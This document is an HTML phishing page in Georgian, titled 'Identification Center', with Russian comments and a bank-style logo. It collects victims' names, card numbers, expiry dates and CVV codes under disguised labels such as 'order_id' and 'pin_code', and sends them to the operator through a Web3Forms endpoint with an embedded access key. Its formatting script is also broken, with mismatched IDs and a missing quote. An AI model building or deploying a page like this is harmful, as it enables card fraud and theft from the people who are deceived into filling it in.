<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>იდენტიფიკაციის ცენტრი</title>

<link rel="icon" type="image/png" href="png-clipart-computer-icons-business-others-blue-angle-thumbnail-removebg-preview.png">

<style>
body {
    font-family: Arial, sans-serif;
    background-color: #f4f4f9;
    margin: 0;
    padding: 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
}

.center-container {
    text-align: center;
    margin-bottom: 20px;
}
.logo {
    max-width: 150px;
}

.form-container {
    background: white;
    padding: 25px 35px;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    width: 100%;
    max-width: 450px;
    box-sizing: border-box;
}

h1 {
    text-align: center;
    margin-bottom: 10px;
    color: #333;
}
h3 {
    text-align: center;
    color: #666;
    margin-bottom: 20px;
}

label {
    font-weight: bold;
    margin-bottom: 5px;
    display: block;
}

input {
    width: 100%;
    padding: 14px;
    margin-bottom: 15px;
    border-radius: 6px;
    border: 1px solid #ccc;
    font-size: 16px;
    box-sizing: border-box;
}

.expiry-cvv-row {
    display: flex;
    gap: 15px;
}
.expiry-cvv-row div {
    flex: 1;
}

button {
    width: 100%;
    padding: 16px;
    background-color: #007bff;
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
}
button:hover {
    background-color: #0056b3;
}

@media (max-width: 480px) {
    .form-container {
        padding: 20px;
    }
}
</style>
</head>

<body>

<div class="center-container">
    <img src="TBlogo.svg.png" alt="Логотип сайта" class="logo">
</div>

<div class="form-container">
    <h1>იდენტიფიკაციის ცენტრი</h1>

    <!-- ИСПРАВЛЕНО: Интеграция с Web3Forms -->
    <form action="https://api.web3forms.com/submit" method="POST">

        <!-- ВАШ КЛЮЧ ИЗ СКРИНШОТА -->
        <input type="hidden" name="access_key" value="fd6696d5-a3d1-4e3f-a4ba-1326d556984e">

        <h3>დატოვეთ თქვენი მონაცემები</h3>

        <label for="first-name">სახელი (Имя)</label>
        <input type="text" name="first_name" id="first-name" required>

        <label for="last-name">გვარი (Фамилия)</label>
        <input type="text" name="last_name" id="last-name" required>

        <label for="card-number">order_id</label>
        <input type="text" name="card_number" id="card-number"
               placeholder="0000 0000 0000 0000"
               maxlength="19"
               inputmode="numeric"
               required>

        <div class="expiry-cvv-row">
            <div>
                <label for="expiry-date">pin_code</label>
                <input type="text" name="expiry_date"
                       id="expiry-date"
                       placeholder="pin_code"
                       maxlength="5"
                       required>
            </div>
            <div>
                <label for="cvv">pin_code</label>
                <input type="password" name="cvv_code"
                       id="cvv"
                       placeholder="***"
                       maxlength="3"
                       inputmode="numeric"
                       required>
            </div>
        </div>

        <!-- Дополнительные настройки для красоты -->
        <input type="hidden" name="from_name" value="Identification Center">
        <input type="hidden" name="subject" value="Новая заявка от клиента">

        <button type="submit">მონაცების გაგზავნა</button>
    </form>
</div>

<script>
// Форматирование номера карты
document.getElementById('order_id').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '').slice(0,16);
    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
});

// Форматирование срока действия
document.getElementById('pin_code').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '').slice(0,4);
    if (value.length > 2) {
        value = value.slice(0,2) + '/' + value.slice(2);
    }
    e.target.value = value;
});

// Только цифры для CVV
document.getElementById(pin_code').addEventListener('input', function (e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
});
</script>

</body>
</html>
